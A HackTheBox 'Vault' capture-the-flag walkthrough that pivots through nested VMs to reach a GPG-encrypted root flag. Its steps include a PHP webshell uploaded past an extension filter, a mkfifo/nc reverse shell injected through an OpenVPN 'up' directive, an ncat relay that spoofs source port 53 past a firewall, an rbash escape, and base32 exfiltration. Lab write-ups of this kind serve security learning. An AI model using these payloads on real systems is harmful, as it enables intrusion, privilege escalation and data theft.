
# HackTheBox: Vault — Complete Walkthrough

> **Box:** Vault &nbsp;|&nbsp; **OS:** Linux (Ubuntu 16.04) &nbsp;|&nbsp; **Difficulty:** Medium
> **Theme:** Network pivoting through nested VMs, firewall source-port bypass, GPG key separation.
> **Skills practiced:** File-upload filter bypass, OpenVPN config RCE, SSH tunneling/relays, restricted-shell (rbash) escape, moving data across air-gapped-ish segments, GPG decryption.

This guide assumes:
- **Attacker (Kali) IP:** `10.10.16.84`
- **Target (Ubuntu host) IP:** `10.129.6.41`

Replace these with your own values if your instance differs.

---

## Table of Contents
1. [The Mental Model — What Vault Actually Is](#0-the-mental-model)
2. [Step 1 — Recon: Find the Front Door](#step-1--recon)
3. [Step 2 — Web Enumeration](#step-2--web-enumeration)
4. [Step 3 — File Upload Filter Bypass (`.php5`)](#step-3--file-upload-filter-bypass)
5. [Step 4 — Confirm Remote Code Execution](#step-4--confirm-rce)
6. [Step 5 — Loot Credentials](#step-5--loot-credentials)
7. [Step 6 — SSH as dave (foothold on the host)](#step-6--ssh-as-dave)
8. [Step 7 — Discover the Internal Network](#step-7--discover-the-internal-network)
9. [Step 8 — Enumerate the Configurator (192.168.122.4)](#step-8--enumerate-the-configurator)
10. [Step 9 — OpenVPN Config RCE → root on DNS (user.txt)](#step-9--openvpn-config-rce)
11. [Step 10 — Loot DNS: more creds + the next target](#step-10--loot-dns)
12. [Step 11 — Understand the Firewall (source-port magic)](#step-11--understand-the-firewall)
13. [Step 12 — Build the ncat Relay through the Firewall](#step-12--build-the-relay)
14. [Step 13 — SSH into Vault + escape rbash](#step-13--ssh-into-vault)
15. [Step 14 — Exfiltrate the encrypted flag (base32)](#step-14--exfiltrate-the-flag)
16. [Step 15 — Decrypt root.txt with the GPG key](#step-15--decrypt-roottxt)
17. [Cleanup](#cleanup)
18. [Lessons & The Hacker Mindset](#lessons)
19. [Appendix: Full Network Map](#appendix-network-map)

---

## 0. The Mental Model

Before touching a single command, understand the shape of this box. Vault is **not** a single machine — it's a host running **three KVM/QEMU virtual machines** behind it. You have to pivot through them one at a time, like passing through locked rooms, and each room only lets you see the door to the next.

```
[ Kali 10.10.16.84 ]
        │  (you can ONLY reach the front host)
        ▼
[ Ubuntu HOST  10.129.6.41 / virbr0 = 192.168.122.1 ]   ← web exploit lands here (www-data → dave)
        │   This host bridges a private network: 192.168.122.0/24
        ├──► [ DNS + Configurator  192.168.122.4 ]   ← OpenVPN RCE → root → user.txt
        ├──► [ Firewall            192.168.122.5 ]   ← gatekeeper to the 192.168.5.0/24 net
        └──► [ Vault VM            192.168.5.2:987 ] ← behind firewall, holds root.txt.gpg
```

**Why this matters for mindset:** every time you land on a new machine, your *first question* is always *"What can this machine see that my previous machine could not?"* That's the entire game. You collect a foothold, look at its network interfaces and its files, and that tells you where the next door is.

---

## Step 1 — Recon

> **Goal:** Find which ports/services are exposed on the only host we can reach.

**Verify the target is alive:**
```bash
ping -c 2 10.129.6.41
```

**Why:** Confirms routing works (you're connected to the HTB VPN) before you waste time scanning a dead host. A reply with `ttl=63` also hints it's a Linux box one hop away.

**Scan for services:**
```bash
nmap -sV -sC -p 22,80 -oN nmap/scripts 10.129.6.41
```
- `-sV` = identify service versions
- `-sC` = run default safe scripts
- `-oN` = save output to a file (always keep notes!)

> In a real engagement you'd run a **full** port sweep first (`nmap -p- --min-rate 10000`). For this box only 22 and 80 are open, so we target them directly.

**Result:**
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

**Hacker mindset:** Two doors. SSH almost never gives an unauthenticated way in (we have no creds yet), so the web server is the obvious starting point. *Attack the surface that takes input from anonymous users.*

---

## Step 2 — Web Enumeration

> **Goal:** Map the website. Hidden directories and files are where the real functionality hides.

The home page just mentions a customer named **"sparklays"**. That word is a breadcrumb — vendor/customer names often map to directory names.

**Check the lead and brute-force directories:**
```bash
# The hint directory
curl -s -o /dev/null -w "%{http_code}\n" http://10.129.6.41/sparklays/

# Brute force (the original solve used gobuster):
gobuster dir -u http://10.129.6.41/sparklays/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
```

**What we find (drilling down recursively):**
```
/sparklays/login.php
/sparklays/admin.php
/sparklays/design/design.html
/sparklays/design/changelogo.php   ← an UPLOAD form
/sparklays/design/uploads/         ← where uploads land
```

**Confirm the upload page exists:**
```bash
curl -s http://10.129.6.41/sparklays/design/changelogo.php
```
```html
<form enctype="multipart/form-data" action="" method="post">
    <input id="file" type="file" name="file" /><br />
    <input type="submit" value="upload file" name="submit" />
</form>
```

**Hacker mindset:** An upload form is gold. If the server lets you upload a file *and* that file lives somewhere the web server will *execute* it (here `/uploads/` under a PHP-enabled Apache), you potentially have remote code execution. The form field name is `file` and the submit button is `submit` — we need those exact names to script the upload.

---

## Step 3 — File Upload Filter Bypass

> **Goal:** Upload a PHP file that the server will run. The server filters extensions, so we must find one that (a) slips past the filter and (b) is still executed as PHP.

If you upload `shell.php`, it's rejected. The server is filtering by **extension**. PHP has *several* extensions Apache may execute: `.php`, `.php3`, `.php4`, `.php5`, `.phtml`, `.pht`. Filters often blacklist `.php` but forget the variants — or, as here, use a whitelist that happens to include `.php5`.

> The actual server-side check (revealed by reading `changelogo.php`) is:
> ```php
> if(!preg_match('/(gif|jpe?g|png|csv|php5)$/i', $file_name)) { reject } else { accept }
> ```
> Note the developer accidentally **whitelisted `php5`** as if it were an image type. That's our way in.

**Create a minimal PHP webshell:**
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > cmd.php5
```
- `system()` runs a shell command and prints its output.
- `$_REQUEST["cmd"]` reads a parameter named `cmd` from the URL or POST body.

**Upload it via curl (mimicking the form):**
```bash
curl -s -F "file=@cmd.php5" -F "submit=upload file" \
     http://10.129.6.41/sparklays/design/changelogo.php
```
- `-F "file=@cmd.php5"` = multipart file upload, field name `file`, `@` means "read this local file".

**Result:** `The file was uploaded successfully` 

**Hacker mindset:** Keep the payload *tiny and reliable*. A one-line `system($_REQUEST['cmd'])` shell works over GET or POST, is trivial to drive with `curl`, and is easy to clean up later. Don't reach for a giant feature-rich webshell when one line gets the job done.

---

## Step 4 — Confirm RCE

> **Goal:** Prove the uploaded file actually executes commands.

```bash
curl -s "http://10.129.6.41/sparklays/design/uploads/cmd.php5?cmd=id"
```
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have command execution as **`www-data`** (the low-privileged web server user).

**Hacker mindset:** The very first command you run on a new shell is almost always `id` — *who am I, and what groups am I in?* It instantly tells you your privilege level and hints at lateral/privilege-escalation paths (e.g., membership in `docker`, `lxd`, `sudo`).

---

## Step 5 — Loot Credentials

> **Goal:** Look for credentials and notes left lying around. CTF boxes (and real networks!) are full of these.

We have RCE but only as `www-data`. We can read other users' world-readable files. Let's check home directories.

```bash
curl -s "http://10.129.6.41/sparklays/design/uploads/cmd.php5?cmd=cat+/home/dave/Desktop/ssh+/home/dave/Desktop/key+/home/dave/Desktop/Servers"
```
```
dave
Dav3therav3123          ← SSH password for dave
itscominghome           ← (mystery string — turns out to be a GPG passphrase)
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x           ← the goal; "x" = unknown IP for now
```

Three priceless finds:
1. **`ssh`** → username `dave`, password `Dav3therav3123`.
2. **`key`** → `itscominghome`. We don't know what it unlocks yet — *note it and move on.*
3. **`Servers`** → a map of the internal network and the names of the next targets.

**Hacker mindset:** Loot *everything* and hold onto data even if it has no obvious use yet (the `key` file). Half of hacking is **patience with breadcrumbs** — a string that's meaningless now becomes the master key three pivots later. Also: a "Servers" file is the box author basically handing you the network topology. Read it carefully.

---

## Step 6 — SSH as dave

> **Goal:** Upgrade from a clumsy webshell to a real interactive shell.

```bash
ssh dave@10.129.6.41
# password: Dav3therav3123
```
```
dave@ubuntu:~$ id
uid=1001(dave) gid=1001(dave) groups=1001(dave)
```

**Hacker mindset:** A reverse/webshell is fragile (no job control, no tab completion, dies easily). The moment you find valid SSH creds, *get a proper TTY*. Comfortable footing makes the rest of the box dramatically easier — and you'll need stable shells for the tunneling ahead.

---

## Step 7 — Discover the Internal Network

> **Goal:** Find out what *this* host can see that Kali cannot.

```bash
ifconfig virbr0
```
```
virbr0  inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
```

The interface name `virbr0` ("virtual bridge 0") is a dead giveaway: **this host runs libvirt/KVM virtual machines**, and it's the gateway (`.1`) for the `192.168.122.0/24` network. From the Servers file we already know:
- `192.168.122.4` = DNS + Configurator
- `192.168.122.5` = Firewall

**Quick ping sweep to confirm live hosts:**
```bash
for i in $(seq 1 254); do (ping -c1 -W1 192.168.122.$i | grep "bytes from" &); done
```

**Hacker mindset:** *Every new host = re-run recon from its perspective.* Kali can't route to `192.168.122.0/24`, but `dave@ubuntu` sits right on it. The discovery of `virbr0` is the "aha" that reframes the box from "one machine" to "a network of machines I must hop through." Interface names, routing tables (`route -n`), and `/etc/hosts` are your treasure maps.

---

## Step 8 — Enumerate the Configurator

> **Goal:** Find the attack surface on `192.168.122.4`.

`curl` isn't installed on this host, so use `wget`:
```bash
wget -qO- http://192.168.122.4/
wget -qO- http://192.168.122.4/vpnconfig.php
```

The index links to `vpnconfig.php`, which serves a form:
```html
<form action="vpnconfig.php?function=testvpn" method="post">
  <textarea name="text"></textarea>
  <input type="submit" value="Update file">
</form>
<a href="vpnconfig.php?function=testvpn">Test VPN</a>
```

It lets you **submit an OpenVPN config file** (`text` parameter) and then **execute it** (`?function=testvpn`). The page even hints: *"nobind must be used."*

**Hacker mindset:** A web app that takes a config file and then **runs a program against it** is a screaming red flag. OpenVPN configs are not just data — they can contain directives that execute shell commands. *Any feature that says "test/run/execute your config" is an RCE waiting to happen.*

---

## Step 9 — OpenVPN Config RCE

> **Goal:** Abuse the OpenVPN `up` directive to get a shell. OpenVPN runs the command in an `up` line *after the tunnel device initializes* — and here it runs as **root**.

### The trick
OpenVPN config files support:
```
script-security 2          # allow running external scripts
up "<command>"             # run <command> after the interface comes up
```
With a static point-to-point `ifconfig` line, the TUN device initializes immediately and fires the `up` command — no real VPN server needed.

### Set up the catcher (Terminal 2)
The reverse shell must call back to a host the Configurator can reach. The Configurator (`192.168.122.4`) can reach the ubuntu host at `192.168.122.1` — **but it cannot reach Kali** (Kali is on the far side of the ubuntu host). So we listen **on ubuntu**, not on Kali.

Open a **second SSH session** to ubuntu and start a listener:
```bash
ssh dave@10.129.6.41          # password: Dav3therav3123
nc -lvnp 8181
```

### Fire the payload (Terminal 1, on ubuntu)
The malicious config, before URL-encoding:
```
remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 8181 >/tmp/f'"
nobind
```
The `up` line is a classic **mkfifo reverse shell** (works with OpenBSD netcat, which has no `-e` flag).

Deliver it via POST (URL-encoded, `%0A` = newline) and trigger execution:
```bash
wget -qO- --post-data='text=remote%20192.168.122.1%0Aifconfig%2010.200.0.2%2010.200.0.1%0Adev%20tun%0Ascript-security%202%0Aup%20%22%2Fbin%2Fbash%20-c%20%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.122.1%208181%20%3E%2Ftmp%2Ff%27%22%0Anobind' \
  'http://192.168.122.4/vpnconfig.php?function=testvpn'
```

### Catch root (Terminal 2)
```
Connection from [192.168.122.4] port 8181 ...
# id
uid=0(root) gid=0(root) groups=0(root)
```

 **root on the DNS/Configurator VM.**

> **Note on the callback target:** We aimed the reverse shell at `192.168.122.1:8181` (the ubuntu host) — *not* at Kali. This is a recurring theme: a deep host can only "phone home" to the segment it can actually route to. Know your network map or your shells silently fail.

**Hacker mindset:** When you craft a reverse shell across pivots, the single most common mistake is pointing it at an IP the victim can't reach. Always answer: *"From where this command runs, what is the path back to a listener I control?"* Here that path is the ubuntu host's `192.168.122.1`.

---

## Step 10 — Loot DNS

> **Goal:** Grab the user flag and the credentials/IPs for the next hop.

In the root@DNS shell:
```bash
cat /home/dave/user.txt
cat /home/dave/ssh
cat /etc/hosts
```
```
a4947f[redacted]bd88c73     ← user.txt
dave
dav3gerous567                         ← new password (DNS + Vault)
...
192.168.5.2    Vault                  ← the Vault's real IP (was "x")!
```

`/etc/hosts` reveals the Vault lives at **`192.168.5.2`** — a *different* subnet (`192.168.5.0/24`) we couldn't see from ubuntu. And from the Servers file, the **Firewall (`192.168.122.5`)** stands between us and that subnet.

**Hacker mindset:** `/etc/hosts`, `~/.ssh/known_hosts`, `.bash_history`, and log files are the richest sources of "what talks to what." The author placed the next target's IP exactly where a careful enumerator would look. *Read the boring config files — they hand you the map.*

> **Bonus path-finding (optional):** `grep -rHa "192.168.5.2" /var/log` on DNS reveals `auth.log` entries showing dave logging in *from* the Vault with **source port 4444**, plus root running:
> ```
> nmap 192.168.5.2 -Pn --source-port=4444 -f
> ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
> ```
> These log lines literally show you the firewall-bypass technique and the relay command. Logs are a walkthrough left behind by the previous user.

---

## Step 11 — Understand the Firewall

> **Goal:** Figure out why we can't reach Vault directly, and how to slip past.

The routing table on DNS shows traffic to `192.168.5.0/24` is sent via the Firewall (`192.168.122.5`). A normal scan of Vault shows everything filtered:
```bash
ncat 192.168.5.2 987 -w 3 </dev/null        # times out / no banner
```

But the auth.log breadcrumbs hinted at **source ports 53 and 4444**. The Firewall is configured to only forward packets whose *source port* is 53 (DNS) or 4444. Test it:
```bash
ncat 192.168.5.2 987 -p 53 -w 3 </dev/null
```
```
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4     ← it answers!
```
- `-p 53` forces our **source** port to 53, which the firewall whitelists.

So **Vault runs SSH on port 987**, reachable only if our source port is 53 (or 4444).

**Hacker mindset:** Firewalls usually filter on *destination*, but some filter on *source port* (a legacy trick from when DNS/NTP used fixed source ports). When a port is "filtered" from one tool but the logs show it being used, ask *"what's different about the traffic that's allowed?"* The answer here was a non-obvious property: the **source** port, not the destination.

---

## Step 12 — Build the Relay

> **Goal:** SSH normally doesn't let you set a source port. We need a middle-man that accepts our connection and re-emits it toward Vault *with source port 53*.

`ncat`'s `--sh-exec` lets one listener pipe its data into another command. We chain two ncats:

```bash
# On DNS (as root, because binding source port 53 requires privilege):
ncat -lk 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" >/tmp/relay.log 2>&1 &
```
- `-l 1234` = listen on port 1234 (any client can connect here)
- `-k` = keep listening for multiple connections
- `--sh-exec "ncat 192.168.5.2 987 -p 53"` = for each connection, fire a *new* ncat to Vault's SSH **with source port 53**

Verify it's listening:
```bash
netstat -lntp | grep 1234
# tcp 0 0 0.0.0.0:1234 ... LISTEN ... ncat
```

Now anything that connects to **DNS:1234** is transparently forwarded to **Vault:987** through the firewall.

**Hacker mindset:** When a protocol (SSH) can't natively do what you need (set a source port), insert a dumb relay that *can*. `ncat --sh-exec` is the duct tape of pivoting. Think in terms of *"plumbing"*: build pipes that carry your traffic to places it normally can't go. Bind privileged ports as root.

---

## Step 13 — SSH into Vault

> **Goal:** Connect to Vault through the relay and escape its restricted shell.

From the **ubuntu** host (which can reach DNS on `192.168.122.4:1234` directly — same subnet, no firewall involved):
```bash
ssh dave@192.168.122.4 -p 1234 -t bash
# password: dav3gerous567
```
- `-p 1234` = connect to the relay (which forwards to Vault:987 with src port 53)
- `-t bash` = **force a TTY and run `bash`** — this is the rbash escape

```
dave@vault:~$ id
uid=1001(dave) gid=1001(dave)
```

We're on **Vault**. By default Vault drops you into **`rbash`** (restricted bash — no `cd`, no `/` in commands, limited PATH). Requesting `bash` directly via `ssh -t bash` sidesteps rbash entirely because the restriction is only applied to the *login* shell, not to a command we explicitly ask SSH to run.

**Hacker mindset:** Restricted shells are speed bumps, not walls. Common escapes: `ssh user@host -t bash`, `vi` → `:!bash`, `python -c 'pty.spawn("/bin/bash")'`, or any allowed program with a shell-escape feature. Always test the *cheapest* escape first.

---

## Step 14 — Exfiltrate the Flag

> **Goal:** The flag is GPG-encrypted and the private key isn't here. We must move the encrypted file to where the key lives.

```bash
ls -la
file root.txt.gpg
```
```
root.txt.gpg: PGP RSA encrypted session key - keyid: ... RSA 4096b
```

Attempting to decrypt on Vault fails — *no secret key here*:
```bash
gpg -d root.txt.gpg
# gpg: decryption failed: secret key not available
```

Vault is missing common transfer tools (no `nc` chains set up for us, no `scp` convenience), **but it has `base32`**. We encode the binary file into copy-pasteable ASCII:
```bash
base32 -w0 root.txt.gpg
# QUBAYA6HPDDB...long blob...RI7XY=
```
- `-w0` = no line wrapping → one clean line to copy.

Copy that blob.

**Hacker mindset:** Data exfiltration over a hostile/limited link is a "what do I have?" puzzle. No `scp`? No `nc`? Fine — *any* text encoder (`base64`, `base32`, `xxd`, `od`, even `openssl base64`) turns a binary into text you can paste through whatever channel you do have. Check what binaries exist (`ls /usr/bin`, `compgen -c`) and improvise.

---

## Step 15 — Decrypt root.txt

> **Goal:** Reunite the encrypted file with its private key. The key (`david <dave@david.com>`, ID `D1EB1F03`) lives in **dave's keyring on the ubuntu host**, and the passphrase is the mystery `key` file from Step 5: `itscominghome`.

Open a clean shell on the **ubuntu** host (the key is *not* on DNS or Vault):
```bash
ssh dave@10.129.6.41          # password: Dav3therav3123
gpg --list-secret-keys
# sec 4096R/0FDFBFE4 ... uid david <dave@david.com> ... ssb 4096R/D1EB1F03
```

Decode the pasted blob and decrypt:
```bash
echo 'QUBAYA6HPDDB...RI7XY=' | base32 -d > /tmp/a.gpg
gpg -d /tmp/a.gpg
# Enter passphrase: itscominghome
```
```
ca468[redacted]9bfe819     ← root.txt 🏁
```

**Hacker mindset:** This is the box's signature lesson — **the lock and the key are deliberately stored on different machines.** The encrypted flag is on Vault; the private key is back on ubuntu; the passphrase was a random string you grabbed in Step 5 and held for six steps. Pulling it together rewards the player who *collected and remembered everything*. Encryption only protects data if the key isn't sitting next to it — and attackers win when developers/admins violate that rule.

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| **user.txt** | `/home/dave/user.txt` on DNS (192.168.122.4) | `a4947faa[redacted]d88c73` |
| **root.txt** | `~/root.txt.gpg` on Vault (192.168.5.2), decrypted on ubuntu | `ca46837[redacted]bfe819` |

---

## Cleanup

Be courteous to other players and tidy after yourself:
```bash
# On ubuntu host:
rm -f /sparklays/design/uploads/cmd.php5 2>/dev/null   # (path is /var/www/html/...)
rm -f /tmp/a.gpg

# On DNS (root shell): stop the relay you backgrounded
kill <ncat_pid>          # the PID from `netstat -lntp | grep 1234`
rm -f /tmp/relay.log /tmp/f
```

---

## Lessons & The Hacker Mindset

1. **Re-enumerate from every new vantage point.** Each host sees a different slice of the network. Check `ip a` / `ifconfig`, `route -n`, `/etc/hosts`, and `arp -a` the moment you land.
2. **Hoard breadcrumbs.** The `itscominghome` string was useless for 6 steps, then unlocked the final flag. Never discard loot.
3. **Logs are confessions.** `/var/log/auth.log` literally showed the firewall-bypass source ports and the exact relay command the previous user ran.
4. **Reverse shells must reach a listener the victim can route to.** Across pivots, point callbacks at the *adjacent* hop, not at Kali.
5. **Restricted shells and odd firewalls are speed bumps.** `ssh -t bash` beats rbash; `-p 53` beats a source-port firewall; `base32` beats a missing `scp`.
6. **Features that "run" your input are RCE.** The OpenVPN "Test VPN" button and the file-upload-then-serve flow are the same pattern: untrusted input reaching an executor.
7. **Keys and locks must live apart.** The whole endgame exists because the GPG key wasn't stored with the encrypted file. Good security; great puzzle.

---

## Appendix: Network Map

```
                          INTERNET / HTB VPN
                                  │
                          ┌───────┴────────┐
                          │  Kali 10.10.16.84 │
                          └───────┬────────┘
                                  │  HTTP (80) + SSH (22)
                                  ▼
        ┌─────────────────────────────────────────────────────┐
        │  UBUNTU HOST  10.129.6.41                             │
        │  virbr0 = 192.168.122.1  (KVM/QEMU hypervisor)        │
        │  • www-data → dave (web upload + SSH creds)           │
        │  • holds the GPG PRIVATE KEY (david / D1EB1F03)       │
        └───────┬───────────────────┬───────────────────┬──────┘
                │ 192.168.122.0/24   │                   │
                ▼                    ▼                   ▼
   ┌────────────────────┐  ┌──────────────────┐  (route to 192.168.5.0/24
   │ DNS+Configurator   │  │ Firewall         │   goes THROUGH the firewall)
   │ 192.168.122.4      │  │ 192.168.122.5    │
   │ • OpenVPN RCE→root │  │ • allows ONLY    │
   │ • user.txt         │  │   src port 53 /  │
   │ • creds dav3gerous │  │   4444 to reach  │
   │ • ncat relay :1234 │──┼──► Vault:987     │
   └────────────────────┘  └────────┬─────────┘
                                     ▼
                          ┌────────────────────────┐
                          │ VAULT VM  192.168.5.2   │
                          │ SSH on :987 (rbash)     │
                          │ • root.txt.gpg (encrypted) │
                          └────────────────────────┘
```

---

*Walkthrough generated for educational/authorized lab use on HackTheBox. Box: Vault by nol0gz.*
